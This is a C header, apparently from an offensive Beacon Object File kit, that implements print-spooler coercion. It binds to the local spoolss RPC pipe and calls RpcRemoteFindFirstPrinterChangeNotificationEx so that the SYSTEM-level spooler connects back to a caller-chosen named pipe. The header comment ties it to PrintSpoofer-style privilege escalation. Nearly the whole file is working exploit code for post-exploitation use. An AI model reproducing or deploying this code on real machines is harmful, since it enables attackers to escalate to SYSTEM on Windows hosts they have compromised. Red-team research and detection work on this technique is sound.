/*
 * AdaptixBOFKit - SpoolSS printer-change coercion.
 *
 * Asks the local print spooler to connect back to a named pipe.  Used by the
 * PrintSpoofer-style BOFs; the caller must already be listening on the pipe.
 */
#ifndef ADAPTIX_SPOOLSS_H
#define ADAPTIX_SPOOLSS_H

#include <windows.h>
#include <rpc.h>
#include "bofdefs.h"
#include "helpers.h"

static inline int bof_spoolss_coerce(const char *pipe)
{
    char notify[512];
    wchar_t wprinter[256], wnotify[512];
    RPC_CSTR binding = NULL;
    RPC_BINDING_HANDLE bh = NULL;
    handle_t hPrinter = NULL;
    DWORD rc;
    int ok = -1;

    if (!pipe || !pipe[0]) return -1;
    bof_strncpy(notify, "\\\\127.0.0.1\\pipe\\", sizeof(notify));
    bof_strncat(notify, pipe, sizeof(notify) - bof_strlen(notify) - 1);

    bof_a2w("\\\\127.0.0.1", wprinter, 256);
    bof_a2w(notify, wnotify, 512);

    rc = RPCRT4$RpcStringBindingComposeA(NULL, (RPC_CSTR)"ncacn_np",
            (RPC_CSTR)"127.0.0.1", (RPC_CSTR)"\\pipe\\spoolss", NULL, &binding);
    if (rc != 0) return -1;
    rc = RPCRT4$RpcBindingFromStringBindingA(binding, &bh);
    if (rc != 0) {
        RPCRT4$RpcStringFreeA(&binding);
        return -1;
    }

    rc = SPOOLSS$RpcOpenPrinter(wprinter, &hPrinter, NULL, NULL, 0);
    if (rc == 0 && hPrinter) {
        rc = SPOOLSS$RpcRemoteFindFirstPrinterChangeNotificationEx(
                hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */, 0,
                wprinter, 0, wnotify);
        SPOOLSS$RpcClosePrinter(&hPrinter);
        if (rc == 0) ok = 0;
    }

    RPCRT4$RpcBindingFree(&bh);
    RPCRT4$RpcStringFreeA(&binding);
    return ok;
}

#endif /* ADAPTIX_SPOOLSS_H */
